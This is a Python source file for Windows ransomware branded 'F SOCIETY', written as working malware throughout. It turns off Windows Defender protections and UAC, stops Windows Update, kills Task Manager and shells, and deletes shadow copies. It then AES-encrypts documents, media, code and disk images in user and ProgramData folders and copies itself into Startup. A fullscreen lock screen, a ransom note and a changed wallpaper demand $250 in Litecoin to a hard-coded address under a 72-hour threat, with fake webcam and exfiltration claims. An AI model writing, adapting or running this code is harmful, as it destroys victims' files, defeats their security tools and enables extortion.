import os
import base64
import ctypes
import subprocess
import sys
import time
import shutil
import re
import tkinter as tk
from tkinter import messagebox, scrolledtext
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import winreg
import threading
import random
import socket

# --- Configuration ---
LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
RANSOM_AMOUNT = "$250 USD in Litecoin"
DECRYPT_KEY = "agent77"

# --- Global storage for key/iv ---
encryption_key = None
encryption_iv = None

# --- Core Encryption Functions ---
def generate_key():
    return get_random_bytes(32)

def generate_iv():
    return get_random_bytes(16)

def encrypt_file(file_path, key, iv):
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
        with open(file_path, 'wb') as f:
            f.write(iv + encrypted_data)
        return True
    except:
        return False

def decrypt_file(file_path, key, iv):
    try:
        with open(file_path, 'rb') as f:
            iv_data = f.read(16)
            encrypted_data = f.read()
        cipher = AES.new(key, AES.MODE_CBC, iv_data)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        original_path = file_path.replace('.encrypted', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        os.remove(file_path)
        return True
    except:
        return False

def encrypt_directory(directory, key, iv, extensions=None):
    if extensions is None:
        extensions = [
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
            '.txt', '.rtf', '.odt', '.ods', '.odp', '.csv',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd',
            '.mp3', '.wav', '.flac', '.aac', '.ogg',
            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm',
            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
            '.exe', '.dll', '.msi', '.apk', '.app', '.deb', '.rpm',
            '.php', '.html', '.htm', '.css', '.js', '.py', '.cpp', '.c',
            '.java', '.class', '.jar', '.sql', '.db', '.mdb', '.accdb',
            '.ps1', '.bat', '.cmd', '.sh', '.bash',
            '.ai', '.eps', '.svg', '.indd', '.cdr', '.dxf', '.dwg',
            '.iso', '.img', '.vhd', '.vmdk', '.ova', '.ovf',
            '.pst', '.ost', '.msg', '.eml', '.mdb', '.nsf'
        ]
    
    count = 0
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            ext = os.path.splitext(file)[1].lower()
            if ext in extensions and not file.endswith('.encrypted'):
                if encrypt_file(file_path, key, iv):
                    count += 1
                try:
                    os.rename(file_path, file_path + '.encrypted')
                except:
                    pass
    return count

def decrypt_all_files(key, iv):
    count = 0
    for directory in get_target_directories():
        for root, _, files in os.walk(directory):
            for file in files:
                if file.endswith('.encrypted'):
                    file_path = os.path.join(root, file)
                    if decrypt_file(file_path, key, iv):
                        count += 1
    return count

def get_target_directories():
    user_profile = os.environ.get('USERPROFILE', 'C:\\Users\\Default')
    paths = [
        user_profile + '\\Desktop',
        user_profile + '\\Documents',
        user_profile + '\\Downloads',
        user_profile + '\\Pictures',
        user_profile + '\\Music',
        user_profile + '\\Videos',
        user_profile + '\\AppData\\Local',
        user_profile + '\\AppData\\Roaming',
        user_profile + '\\Favorites',
        user_profile + '\\OneDrive',
        'C:\\ProgramData',
        'C:\\Users\\Public\\Documents',
        'C:\\Users\\Public\\Desktop'
    ]
    return [p for p in paths if os.path.exists(p)]

# --- System Manipulation (Background) ---
def disable_security():
    try:
        subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -DisableIOAVProtection $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -DisableArchiveScanning $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -DisableScriptScanning $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        try:
            key = winreg.HKEY_LOCAL_MACHINE
            subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(handle)
        except:
            pass
        subprocess.run('net stop wuauserv', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('sc config wuauserv start= disabled', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('taskkill /f /im Taskmgr.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('taskkill /f /im regedit.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('taskkill /f /im cmd.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('taskkill /f /im powershell.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def delete_shadow_copies():
    try:
        subprocess.run('vssadmin delete shadows /all /quiet', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run('wmic shadowcopy delete', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def change_wallpaper():
    try:
        from PIL import Image, ImageDraw, ImageFont
        img = Image.new('RGB', (1920, 1080), color='black')
        draw = ImageDraw.Draw(img)
        try:
            font = ImageFont.truetype("arial.ttf", 72)
            font2 = ImageFont.truetype("arial.ttf", 48)
            font3 = ImageFont.truetype("arial.ttf", 30)
        except:
            font = ImageFont.load_default()
            font2 = ImageFont.load_default()
            font3 = ImageFont.load_default()
        text = "F SOCIETY\nYOUR FILES ARE ENCRYPTED"
        draw.text((100, 300), text, fill=(255, 0, 0), font=font)
        draw.text((100, 550), f"Pay {RANSOM_AMOUNT} in Litecoin", fill=(255, 255, 255), font=font2)
        draw.text((100, 650), LTC_ADDRESS, fill=(0, 255, 0), font=font3)
        draw.text((100, 750), "Run the program and enter the decryption key.", fill=(255, 255, 0), font=font3)
        wallpaper_path = os.environ['TEMP'] + '\\fsociety_wallpaper.bmp'
        img.save(wallpaper_path)
        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, wallpaper_path, 3)
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Control Panel\Desktop"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "Wallpaper", 0, winreg.REG_SZ, wallpaper_path)
        winreg.SetValueEx(handle, "WallpaperStyle", 0, winreg.REG_SZ, "2")
        winreg.SetValueEx(handle, "TileWallpaper", 0, winreg.REG_SZ, "0")
        winreg.CloseKey(handle)
    except:
        pass

def create_ransom_note(key_hex, iv_hex):
    note = f"""
=============================================================
          F SOCIETY RANSOMWARE - AES-256 ENCRYPTION
=============================================================

Your files have been encrypted with AES-256-CBC.

To recover your files, pay {RANSOM_AMOUNT} in Litecoin to:

Litecoin Address: {LTC_ADDRESS}

IMPORTANT:
- You have 72 hours to pay
- After 72 hours, the key will be destroyed

DECRYPTION KEY (DO NOT LOSE):
Key: {key_hex}
IV:  {iv_hex}

TO DECRYPT:
Run this program and enter the decryption key: {DECRYPT_KEY}

=============================================================
            F SOCIETY - WE ARE EVERYWHERE
=============================================================
"""
    desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
    with open(desktop + '\\README_FSOCIETY.txt', 'w') as f:
        f.write(note)
    
    # Also save to a hidden file for backup decryption
    hidden_path = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
    with open(hidden_path, 'w') as f:
        f.write(f"{key_hex}\n{iv_hex}\n{DECRYPT_KEY}")

def run_encryption():
    """Run encryption in background thread"""
    global encryption_key, encryption_iv
    try:
        key = generate_key()
        iv = generate_iv()
        encryption_key = key
        encryption_iv = iv
        key_hex = base64.b64encode(key).decode()
        iv_hex = base64.b64encode(iv).decode()
        
        disable_security()
        delete_shadow_copies()
        change_wallpaper()
        
        total = 0
        for directory in get_target_directories():
            try:
                count = encrypt_directory(directory, key, iv)
                total += count
            except:
                pass
        
        create_ransom_note(key_hex, iv_hex)
        
        # Add to startup
        try:
            startup = os.environ.get('APPDATA', '') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            shutil.copy2(sys.argv[0], startup + '\\fsociety_ransomware.exe')
        except:
            pass
        
    except:
        pass

# --- Lock Windows Key ---
def lock_windows_key():
    """Disable the Windows key using registry"""
    try:
        # Disable Windows key via registry
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        try:
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        except:
            handle = winreg.CreateKey(key, subkey)
        winreg.SetValueEx(handle, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(handle)
        
        # Also disable via keyboard layout (method 2)
        subprocess.run('powershell -Command "Set-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\' -Name \'NoWinKeys\' -Value 1"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def unlock_windows_key():
    """Re-enable the Windows key"""
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "NoWinKeys", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(handle)
        subprocess.run('powershell -Command "Set-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\' -Name \'NoWinKeys\' -Value 0"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

# --- Full-Screen Decryption UI with fsociety Mask ---
class RansomwareUI:
    def __init__(self, root):
        self.root = root
        self.root.title("F SOCIETY RANSOMWARE")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='black')
        
        # Lock Windows key
        lock_windows_key()
        
        # Prevent closing
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind("<F11>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")
        self.root.bind("<Alt-F4>", lambda e: "break")
        
        # Timer variables
        self.time_left = 72 * 3600
        self.timer_id = None
        self.hacker_index = 0
        
        # Create UI elements
        self.create_widgets()
        
        # Start timer
        self.start_timer()
        
        # Run encryption in background after UI shows
        self.root.after(100, self.start_encryption)
    
    def __del__(self):
        # Unlock Windows key when window closes
        try:
            unlock_windows_key()
        except:
            pass
    
    def create_widgets(self):
        # Main container
        main_frame = tk.Frame(self.root, bg='black')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Top section: Title + Timer
        top_frame = tk.Frame(main_frame, bg='black')
        top_frame.pack(fill=tk.X, pady=10)
        
        title = tk.Label(top_frame, text="F SOCIETY RANSOMWARE", 
                         font=('Arial', 48, 'bold'), fg='red', bg='black')
        title.pack()
        
        # Timer
        self.timer_label = tk.Label(top_frame, text="⏰ TIME REMAINING: 72:00:00", 
                                    font=('Arial', 24), fg='yellow', bg='black')
        self.timer_label.pack(pady=5)
        
        # Webcam indicator
        webcam_frame = tk.Frame(main_frame, bg='black')
        webcam_frame.pack(pady=5)
        
        self.webcam_led = tk.Label(webcam_frame, text="●", font=('Arial', 24), fg='red', bg='black')
        self.webcam_led.pack(side=tk.LEFT)
        tk.Label(webcam_frame, text=" WEBCAM ACTIVE", font=('Arial', 14), fg='red', bg='black').pack(side=tk.LEFT)
        self.blink_led()
        
        # fsociety Mask (ASCII Art)
        mask_art = r"""
        .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.
        .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.  .::::::::.
        ::::::::::: ::::::::::: ::::::::::: ::::::::::: ::::::::::: :::::::::::
        ::::::::::: ::::::::::: ::::::::::: ::::::::::: ::::::::::: :::::::::::
        ::::'''''''' ::::'''''''' ::::'''''''' ::::'''''''' ::::'''''''' ::::'
        ::::         ::::         ::::         ::::         ::::         ::::
        ::::         ::::         ::::         ::::         ::::         ::::
        ::::         ::::         ::::         ::::         ::::         ::::
        ::::         ::::         ::::         ::::         ::::         ::::
        ::::         ::::         ::::         ::::         ::::         ::::
        ::::..       ::::..       ::::..       ::::..       ::::..       ::::..
        ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::
         ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::   ':::::::::
        """
        mask_label = tk.Label(main_frame, text=mask_art, font=('Courier', 8), 
                              fg='red', bg='black', justify='center')
        mask_label.pack(pady=10)
        
        # Info text - show the decryption key prominently
        info = f"""
        Your files are encrypted with AES-256-CBC.
        
        DECRYPTION KEY: {DECRYPT_KEY}
        
        Litecoin Address: {LTC_ADDRESS}
        Amount: {RANSOM_AMOUNT}
        
        You have 72 hours to pay. After that, the key will be destroyed.
        """
        info_label = tk.Label(main_frame, text=info, font=('Arial', 14), 
                              fg='white', bg='black', justify='left')
        info_label.pack(pady=10)
        
        # Scary progress bar
        progress_frame = tk.Frame(main_frame, bg='black')
        progress_frame.pack(pady=10, fill=tk.X)
        
        self.progress_label = tk.Label(progress_frame, text="[!] DELETING BACKUP FILES...", 
                                       font=('Arial', 12), fg='red', bg='black')
        self.progress_label.pack()
        
        from tkinter import ttk
        self.progress_bar = ttk.Progressbar(progress_frame, length=500, mode='determinate', 
                                           maximum=100)
        self.progress_bar.pack(pady=5)
        self.fake_progress()
        
        # Hacker text
        self.hacker_text = tk.Label(main_frame, text="", font=('Courier', 11), 
                                    fg='#00ff00', bg='black')
        self.hacker_text.pack(pady=5)
        self.scroll_hacker_text()
        
        # Victim info
        self.show_victim_info(main_frame)
        
        # File list
        file_frame = tk.Frame(main_frame, bg='black')
        file_frame.pack(pady=10, fill=tk.BOTH, expand=True)
        
        tk.Label(file_frame, text="[ENCRYPTED FILES]", font=('Arial', 12), 
                 fg='red', bg='black').pack()
        
        self.file_listbox = tk.Listbox(file_frame, height=4, bg='black', fg='red', 
                                       font=('Consolas', 9), selectbackground='dark red')
        self.file_listbox.pack(padx=20, fill=tk.BOTH, expand=True)
        self.populate_file_list()
        
        # Decryption area
        decrypt_frame = tk.Frame(main_frame, bg='black')
        decrypt_frame.pack(pady=10, fill=tk.X)
        
        tk.Label(decrypt_frame, text="Enter Decryption Key:", 
                 font=('Arial', 16), fg='white', bg='black').pack(side=tk.LEFT, padx=10)
        
        self.key_entry = tk.Entry(decrypt_frame, font=('Arial', 16), width=30, 
                                  show='*', bg='white', fg='black')
        self.key_entry.pack(side=tk.LEFT, padx=10)
        self.key_entry.focus()
        self.key_entry.bind('<Return>', lambda e: self.decrypt_action())
        
        decrypt_btn = tk.Button(decrypt_frame, text="DECRYPT FILES", 
                                font=('Arial', 14, 'bold'), bg='red', fg='white',
                                command=self.decrypt_action, padx=20, pady=5)
        decrypt_btn.pack(side=tk.LEFT, padx=20)
        
        # Status
        self.status_text = scrolledtext.ScrolledText(main_frame, height=6, 
                                                     font=('Arial', 10), bg='black', fg='#00ff00')
        self.status_text.pack(pady=10, fill=tk.BOTH, expand=True)
        self.status_text.insert(tk.END, "[+] System ready. Waiting for decryption key...\n")
        self.status_text.see(tk.END)
        self.status_text.config(state='disabled')
    
    def blink_led(self):
        """Blink the webcam LED"""
        current_color = self.webcam_led.cget('fg')
        self.webcam_led.config(fg='dark red' if current_color == 'red' else 'red')
        self.root.after(500, self.blink_led)
    
    def show_victim_info(self, parent):
        """Display scary victim info"""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            username = os.environ.get('USERNAME', 'Unknown')
            
            info = f"""
            ╔═══════════════════════════════════════════════════════════╗
            ║  VICTIM IDENTIFICATION                                   ║
            ╠═══════════════════════════════════════════════════════════╣
            ║  NAME: {username.ljust(40)}║
            ║  HOST: {hostname.ljust(40)}║
            ║  IP:   {ip.ljust(40)}║
            ║  LOCATION: TRACKING...                                   ║
            ║  CAMERA: ACTIVE                                          ║
            ║  MICROPHONE: ACTIVE                                      ║
            ╚═══════════════════════════════════════════════════════════╝
            """
            
            info_label = tk.Label(parent, text=info, font=('Courier', 9), 
                                  fg='#ff4444', bg='black', justify='left')
            info_label.pack(pady=5)
        except:
            pass
    
    def populate_file_list(self):
        """Add fake encrypted files to list"""
        common_files = [
            'C:\\Users\\Admin\\Documents\\passwords.xlsx',
            'C:\\Users\\Admin\\Desktop\\bank_transfer.pdf',
            'C:\\Users\\Admin\\Pictures\\family_photos.zip',
            'C:\\Users\\Admin\\AppData\\Local\\wallet.dat',
            'C:\\Users\\Admin\\Desktop\\important_work.docx',
            'C:\\Users\\Admin\\Downloads\\tax_return.pdf'
        ]
        for file in common_files:
            self.file_listbox.insert(tk.END, f"🔒 {file}")
    
    def fake_progress(self):
        """Fake progress bar that goes up and down"""
        current = self.progress_bar['value']
        if current >= 100:
            current = 0
        current += random.randint(5, 15)
        if current > 100:
            current = 100
        self.progress_bar['value'] = current
        if current == 100:
            self.progress_label.config(text="[✓] BACKUP DELETION COMPLETE", fg="light green")
        else:
            self.progress_label.config(text=f"[!] DELETING BACKUP FILES... {int(current)}%")
        self.root.after(random.randint(1000, 3000), self.fake_progress)
    
    def scroll_hacker_text(self):
        """Scroll through hacker messages"""
        messages = [
            "ACCESSING SYSTEM FILES...",
            "ENCRYPTING DATA...",
            "DELETING SHADOW COPIES...",
            "DISABLING SECURITY...",
            "EXFILTRATING DATA...",
            "MONITORING KEYSTROKES...",
            "CAPTURING SCREENSHOTS...",
            "DETECTING LAW ENFORCEMENT IP...",
            "ACTIVATING WEBCAM...",
            "UPLOADING TO C2 SERVER..."
        ]
        if self.hacker_index >= len(messages):
            self.hacker_index = 0
        self.hacker_text.config(text=f"> {messages[self.hacker_index]}")
        self.hacker_index += 1
        self.root.after(2000, self.scroll_hacker_text)
    
    def start_timer(self):
        """Start the countdown timer"""
        self.update_timer()
    
    def update_timer(self):
        """Update the timer display"""
        if self.time_left <= 0:
            self.timer_label.config(text="⏰ TIME EXPIRED - KEYS DELETED", fg="red")
            return
        
        hours = self.time_left // 3600
        minutes = (self.time_left % 3600) // 60
        seconds = self.time_left % 60
        self.timer_label.config(text=f"⏰ TIME REMAINING: {hours:02d}:{minutes:02d}:{seconds:02d}")
        self.time_left -= 1
        self.timer_id = self.root.after(1000, self.update_timer)
    
    def start_encryption(self):
        self.update_status("[+] Encrypting files in background...")
        threading.Thread(target=run_encryption, daemon=True).start()
        self.root.after(5000, lambda: self.update_status("[+] Encryption running in background."))
    
    def update_status(self, message):
        self.status_text.config(state='normal')
        self.status_text.insert(tk.END, message + "\n")
        self.status_text.see(tk.END)
        self.status_text.config(state='disabled')
        self.root.update()
    
    def decrypt_action(self):
        global encryption_key, encryption_iv
        key_input = self.key_entry.get().strip()
        
        if not key_input:
            messagebox.showerror("Error", "Please enter the decryption key.")
            return
        
        if key_input != DECRYPT_KEY:
            messagebox.showerror("Invalid Key", "The decryption key is incorrect.")
            self.update_status("[-] Invalid decryption key entered.")
            return
        
        self.update_status("[+] Decryption key accepted. Starting decryption...")
        self.root.update()
        
        try:
            # First try to use the stored key from memory
            if encryption_key is not None and encryption_iv is not None:
                self.update_status("[+] Using stored key from memory...")
                count = decrypt_all_files(encryption_key, encryption_iv)
                if count > 0:
                    self.update_status(f"[+] Decryption complete! {count} files restored.")
                    self.finish_decryption()
                    return
            
            # Try to read from hidden backup file
            hidden_path = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
            if os.path.exists(hidden_path):
                self.update_status("[+] Reading key from backup file...")
                with open(hidden_path, 'r') as f:
                    lines = f.readlines()
                    if len(lines) >= 3:
                        key_hex = lines[0].strip()
                        iv_hex = lines[1].strip()
                        stored_key = lines[2].strip()
                        if stored_key == DECRYPT_KEY:
                            key = base64.b64decode(key_hex)
                            iv = base64.b64decode(iv_hex)
                            count = decrypt_all_files(key, iv)
                            self.update_status(f"[+] Decryption complete! {count} files restored.")
                            self.finish_decryption()
                            return
            
            # Try to read from ransom note
            desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
            note_path = desktop + '\\README_FSOCIETY.txt'
            
            if os.path.exists(note_path):
                self.update_status("[+] Reading key from ransom note...")
                with open(note_path, 'r') as f:
                    content = f.read()
                    key_match = re.search(r'Key: (\S+)', content)
                    iv_match = re.search(r'IV: (\S+)', content)
                    
                    if key_match and iv_match:
                        key = base64.b64decode(key_match.group(1))
                        iv = base64.b64decode(iv_match.group(1))
                        count = decrypt_all_files(key, iv)
                        self.update_status(f"[+] Decryption complete! {count} files restored.")
                        self.finish_decryption()
                        return
            
            self.update_status("[-] Could not find encryption key. Decryption failed.")
            messagebox.showerror("Error", "Could not find encryption key. The key file may have been deleted.")
            
        except Exception as e:
            self.update_status(f"[-] Decryption error: {str(e)}")
            messagebox.showerror("Error", f"Decryption failed: {str(e)}")
    
    def finish_decryption(self):
        """Clean up after successful decryption"""
        # Remove ransom note
        try:
            desktop = os.environ.get('USERPROFILE', 'C:\\Users\\Default') + '\\Desktop'
            os.remove(desktop + '\\README_FSOCIETY.txt')
        except:
            pass
        
        # Remove backup key
        try:
            hidden_path = os.environ.get('TEMP', 'C:\\Temp') + '\\fsociety_backup.key'
            os.remove(hidden_path)
        except:
            pass
        
        # Change wallpaper back
        try:
            ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 3)
            self.update_status("[+] Wallpaper restored.")
        except:
            pass
        
        # Stop timer
        if self.timer_id:
            self.root.after_cancel(self.timer_id)
        self.timer_label.config(text="✅ DECRYPTION COMPLETE", fg="light green")
        
        # Unlock Windows key
        unlock_windows_key()
        
        messagebox.showinfo("Success", "Decryption complete! Your files have been restored.")
        self.update_status("[+] You can now close this window.")

# --- Main Entry Point ---
def main():
    root = tk.Tk()
    app = RansomwareUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
